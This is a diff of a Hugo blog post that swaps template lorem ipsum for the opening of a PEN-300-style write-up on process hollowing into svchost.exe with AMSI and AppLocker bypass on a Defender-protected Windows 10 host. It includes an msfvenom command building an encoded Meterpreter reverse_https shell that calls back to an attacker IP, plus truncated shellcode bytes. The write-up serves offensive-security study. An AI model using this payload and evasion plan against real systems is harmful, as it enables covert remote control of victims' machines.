@@ -1,33 +1,82 @@
 ---
-title: Blog Post with Inline Images
-subtitle: "Blog post subtitle :zap:"
-summary: Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
-date: 2023-11-24
+title: Process Hollowing with Amsi e AppLocker bypass
+# subtitle: "Blog post subtitle :zap:"
+summary: The OffSec PEN-300 course teaches staged shellcode injection in Windows binaries, advanced AV evasion, and AppLocker bypass techniques, but does not combine these with process hollowing methods in one single attack vector.
+date: 2024-12-08
 cardimage: photo1_card.jpeg
 featureimage: photo1.jpeg
-caption: Image caption
-authors:
-  - Christian: author.jpeg
+caption: 
+# authors:
+#   - Christian: author.jpeg
 ---
-Use the shortcode "figArray" to add images to your blog post. Add your images to a subfolder. Call the figArray shortcode using the following syntax:
+
+## Objective
+
+During the study of PEN-300 by OffSec, one of the best techniques taught is the injection of staged shellcode into Windows binaries like **svchost.exe**. The course also covers advanced AV evasion techniques and AppLocker restriction bypass. Unfortunately, there is no chapter that combines process hollowing with these bypass methods, so in this article, I want to show the implementation.
+
+## The setup
+
+The target machine will be an Windows 10 Enteprise fully updated, at the time I am writing, **22H2** version with these Hotfix:
+
+```cmd
+systeminfo
+
+Hotfix(s):                 8 Hotfix(s) Installed.
+                           [01]: KB5048161
+                           [02]: KB5045936
+                           [03]: KB5011048
+                           [04]: KB5015684
+                           [05]: KB5046613
+                           [06]: KB5014032
+                           [07]: KB5016705
+                           [08]: KB5046823
+```
+
+This machine have an Local, non admin account, named **Student** that will simulate out target user.
+
+On top of that tha machine have windows defender fully turn On
+
+{{< figArray subfolder="defender" figCaption="MD settings" >}}
+
+And AppLocker with default rules
+
+{{< figArray subfolder="applocker" figCaption="AppLocker settings" >}}
+
+That prevent the execution of scripts and binary outside default locations of non admin account
+
+```powershell
+PS C:\Users\student> $ExecutionContext.SessionState.LanguageMode
+ConstrainedLanguage
+
+PS C:\Users\student> copy C:\Windows\System32\calc.exe C:\Users\student\Desktop\;
+C:\Users\student\Desktop\calc.exe
+
+Program 'calc.exe' failed to run This program is blocked by group policy. 
+For more information, contact your system administrator
+```
+
+# The strategy
+
+The idea is to create an managed .dll that inject a staged meterpreter shellcode in the native  [svchost.exe](https://learn.microsoft.com/en-us/windows/application-management/svchost-service-refactoring) process, this process was choice because is normally perform network activities so that our reverse shell should be less easly detected.
+
+Because we hava also defender in place we have to craft our payload in an encrypted and objuscated way, implement some of AV heuristic bypass and diasable AMSI at run time.
+
+Because also there is AppLocker in place our user can't invoke .NEt framework script so we have to implemente a bypass to be able to change the **$ExecutionContext.SessionState.LanguageMode** to **FullLanguage** and be able to execute scripts.
+
+## The Process Hollowing .dll
+
+First of all we generate the staget shell code. I choose the https one so the comunication is encrypted and addes some iteration of the most common encoder
+
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.191.226 \
+LPORT=443 -e x86/shikata_ga_nai -i 3 -f csharp
+
+
+byte[] buf = new byte[767] {0xbb,0x3b,0xe5,0x6f,0x90,0xd9,  
+0xcc,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0xba,0x31,0x5e,
+0x12,0x03,0x5e,0x12,0x83,0xd5,0x19,0x8d,0x65,0x96,0x65,0x4e,
+0x33,0xfd,0xb3,0xa5,0xe2,0x89,0x67,0xce,0x4e,0x42,0xa1,0x9f,
+0xc2,0x95,0x4a,0xf3,0x27,0xae,0xbf,0x70,0xe4,0xd3,0x3e,0x36,
+0x25,0x9c,0xf8,0x0e,0x45,0x83,0xdf,0x16,0x3c,0xda,0x0e,...
 
 ```
-{{</* figArray subfolder="<subfoldername>" figCaption="Some caption" numCols=2 */>}}
-```
-Both "figCaption" and "numCols" are optional. The shortcode will try to guess the best number of columns to use for the array of figures if "numCols" is not passed.
-You will need one subfolder containing images per call to the shortcode. The image files need to be one of the following types: png, jpg, jpeg or webp.
-
-{{< figArray subfolder="images" figCaption="A nice figure caption :wave:" >}}
-
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec id erat enim. Ut cursus magna sed luctus auctor. Sed eu augue dignissim, lobortis ipsum eu, dictum nisi. Integer varius ex maximus quam lobortis accumsan. Morbi mollis vulputate metus, aliquam feugiat arcu porta a. Quisque id justo ultricies, lacinia elit quis, pulvinar odio. Fusce feugiat at velit vitae lobortis. Nulla fringilla metus et sem mattis posuere :zap:.
-
-**Heading**
-- List item 1
-- List item 2
-- List item 3
-
-Cras ligula velit, aliquet ac orci dapibus, molestie ultricies libero. Donec at bibendum est. Phasellus vulputate dapibus quam vel accumsan. Curabitur at felis euismod, lobortis urna id, lobortis dolor. Cras tortor ligula, euismod quis lacus faucibus, condimentum fringilla dolor. Mauris in maximus nisi. Phasellus facilisis lacus quis mi cursus, a ornare mi maximus. Nullam nunc lacus, tincidunt varius risus nec, pellentesque vulputate ligula. Etiam id purus et tortor porta mattis. Donec id sapien nulla. Vivamus at malesuada tellus, id ultricies ante. Maecenas ullamcorper mi massa, at rutrum risus aliquet a. Donec sem tortor, molestie quis ex a, faucibus commodo augue. Morbi convallis sem vel tellus facilisis, et sodales felis consequat. Aliquam ut ante tristique, volutpat lectus vestibulum, egestas sapien.
-
-Donec tellus est, faucibus eget ultricies ac, posuere non augue. Fusce ultrices lectus quis nunc lacinia, non tincidunt lectus ultrices. Morbi sodales nisi at felis luctus, eu convallis tortor commodo. Morbi tristique nibh neque, vel tristique dolor laoreet eget. Phasellus felis erat, mattis at suscipit id, faucibus in dolor. In vitae odio at lectus tincidunt dignissim. Fusce risus nisl, hendrerit a ultricies vitae, porta id sapien. Nam elit nunc, hendrerit ut sem quis, ultrices varius leo. Nullam eget lectus in sapien venenatis iaculis at at turpis. Etiam iaculis magna porttitor augue tempus suscipit. Interdum et malesuada fames ac ante ipsum primis in faucibus. Nullam suscipit nibh leo, in pellentesque urna luctus et. Duis diam ipsum, posuere nec tellus sit amet, dignissim feugiat massa. Etiam ut sollicitudin lorem. Quisque commodo libero non mauris viverra malesuada. Morbi vitae auctor felis.
-
-Maecenas ac dignissim dolor. Sed vitae nisl vel ante rutrum tincidunt ac et diam. Integer id dignissim quam. Vestibulum quis enim sit amet tellus tincidunt sagittis ut vitae nunc. Sed hendrerit, quam ut fermentum imperdiet, augue purus cursus felis, in ultricies elit mauris in risus. Morbi hendrerit imperdiet vehicula. Etiam porttitor magna eu quam laoreet ullamcorper. Etiam a erat ante. Curabitur pharetra, lacus in porttitor cursus, libero lacus consectetur dui, sit amet auctor tellus magna et enim. Pellentesque tristique molestie fringilla. Vivamus sit amet tincidunt quam. Morbi eu nisi quam. Nunc ultrices vel sem sit amet aliquam.
